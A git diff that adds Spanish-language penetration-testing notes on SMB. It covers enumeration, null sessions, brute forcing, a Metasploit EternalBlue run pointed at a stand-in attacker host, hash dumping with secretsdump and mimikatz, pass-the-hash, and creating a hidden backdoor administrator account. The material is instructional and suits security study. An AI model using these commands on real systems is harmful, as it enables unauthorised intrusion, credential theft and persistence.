@@ -265,3 +265,155 @@ wget -m ftp://anonymous:anonymous@<target-ip>
 
 **Escalada: Reverse Shell a través de la Web**
 Si el servidor FTP comparte directorio con el servidor Web (por ejemplo, tenemos acceso de escritura en /var/www/html) y el servidor soporta PHP, podemos subir un payload para obtener una shell interactiva.
+
+#### SMB (Server Message Block)
+
+##### ¿Qué es?
+SMB, también conocido históricamente como CIFS (Common Internet File System), es el protocolo de red por excelencia para compartir archivos, impresoras, y para la comunicación entre procesos (IPC) en redes Windows.
+
+Opera principalmente en dos puertos:
+* **Puerto 139 (NetBIOS):** La forma antigua, que requiere resolución NetBIOS sobre TCP/IP.
+* **Puerto 445 (Direct TCP):** La forma moderna, donde SMB se ejecuta directamente sobre TCP sin la capa NetBIOS.
+
+##### Reconocimiento y Enumeración (Recon)
+
+La enumeración de SMB es un arte en sí mismo. Nuestro objetivo es descubrir recursos compartidos, usuarios, grupos y políticas de contraseñas.
+
+###### 1. Detección y Banner Grabbing
+Primero verificamos qué versión de SMB está corriendo y si soporta firmas (SMB Signing).
+
+```bash
+# Escaneo básico de puertos SMB
+nmap -p 139,445 target.com
+
+# Escaneo profundo para descubrir versiones y dialectos
+nmap -p 445 --open -sV target.com
+nmap --script smb-protocols -p 445 target.com
+```
+
+###### 2. Enumeración de Recursos Compartidos (Shares)
+
+Las herramientas de línea de comandos son imprescindibles aquí para listar qué carpetas están expuestas.
+
+```bash
+# Usando smbclient (listar anónimamente)
+smbclient -L //target.com -U anonymous
+
+# Usando smbmap (mapeo recursivo y rápido)
+smbmap -H target.com
+smbmap -H target.com -u username -p password -r
+```
+
+###### 3. Extracción de Usuarios y Grupos
+
+`enum4linux` es la navaja suiza para exprimir la información de directorios activos y servidores Samba.
+
+```bash
+# Extracción total (Usuarios, Grupos, Políticas, Shares)
+enum4linux -a target.com
+
+# Extraer únicamente usuarios
+enum4linux -U target.com
+
+# Extraer la política de contraseñas del dominio
+enum4linux -P target.com
+```
+
+##### Vectores de ataque inciales
+
+###### 1. Null Sessions (Sesiones Nulas)
+
+Una Null Session es una conexión no autenticada (usuario y contraseña en blanco) que históricamente permitía extraer muchísima información de los controladores de dominio. Aunque en sistemas modernos suele estar mitigado, sigue siendo obligatorio probarlo.
+
+```bash
+# Null Session con rpcclient
+rpcclient -U "" target.com
+
+# Null Session con smbclient y smbmap
+smbclient -L //target.com -N
+smbmap -H target.com -u "" -p ""
+```
+
+###### 2. Fuerza Bruta (Bruteforcing)
+
+Si tenemos una lista de usuarios válidos (obtenida con enum4linux), podemos lanzar un ataque de diccionario, siempre teniendo cuidado de no bloquear cuentas (Account Lockout).
+
+```bash
+# Fuerza bruta usando Hydra
+hydra -L users.txt -P passwords.txt smb://target.com
+
+# Fuerza bruta usando Nmap
+nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt target.com
+```
+
+###### 3. Explotación de CVEs Críticos
+
+SMB tiene un historial legendario de vulnerabilidades de Ejecución Remota de Código (RCE). Si encuentras un sistema sin parchear, es acceso instantáneo a NT AUTHORITY\SYSTEM.
+
+- **MS08-067 (Netapi)**: Un clásico en sistemas Windows XP/2003.
+
+- **MS17-010 (EternalBlue)**: El infame exploit utilizado por WannaCry. Afecta a Windows 7/Server 2008.
+
+- **CVE-2020-0796 (SMBGhost)**: Afecta a Windows 10/Server 2019 debido a un fallo en la compresión de SMBv3.
+
+```bash
+# Ejemplo de explotación de EternalBlue con Metasploit
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target.com
+set LHOST attacker-ip
+exploit
+```
+
+##### El movimiento lateral
+
+Una vez que hemos comprometido un host a través de SMB o tenemos credenciales válidas, pasamos a la fase de post-explotación para expandir nuestro control.
+
+###### 1. Credential Harvesting (Extracción de Hashes)
+
+Si tenemos privilegios de administrador, nuestro primer paso es volcar los hashes de las contraseñas locales (SAM) o en memoria (LSASS).
+Bash
+
+```bash
+# Volcado de hashes NTDS/SAM usando Impacket de forma remota
+secretsdump.py domain/user:password@target.com
+
+# Volcado en memoria usando Mimikatz (si tenemos shell)
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+###### 2. Movimiento Lateral (Pass-the-Hash)
+
+Con los hashes NTLM obtenidos, ni siquiera necesitamos crackearlos. Podemos pasarlos directamente para saltar a otras máquinas de la red.
+Bash
+
+```bash
+# Ejecutar comandos remotamente inyectando el Hash (PtH)
+pth-winexe -U domain/username%hash //another-host.com cmd
+
+# Movimiento lateral usando WMI
+wmic /node:another-host.com /user:username /password:password process call create "cmd.exe"
+```
+
+###### 3. Persistencia Básica
+
+Podemos aprovechar el acceso SMB o una shell con privilegios para asegurar nuestra vuelta al sistema.
+Bash
+
+```bash
+# Crear un usuario oculto y meterlo en Administradores Locales
+net user backdoor P@ssw0rd123! /add
+net localgroup administrators backdoor /add
+```
+
+**Comandos (Cheat Sheet)**
+
+| Comando | Descripción | Ejemplo de uso |
+| :--- | :--- | :--- |
+| **smbclient** | Conexión interactiva a un recurso SMB | smbclient //server/share -U user |
+| **smbget** | Descarga recursiva de archivos vía SMB | smbget smb://server/share/file |
+| **smbpasswd** | Cambiar la contraseña SMB de un usuario | smbpasswd -r server -U username |
+| **smbstatus** | Muestra conexiones SMB activas (servidor) | smbstatus |
+| **smbtree** | Árbol visual de los recursos de la red | smbtree |
+| **mount -t cifs** | Montar una carpeta SMB en tu Linux local | mount -t cifs //server/share /mnt/punto |
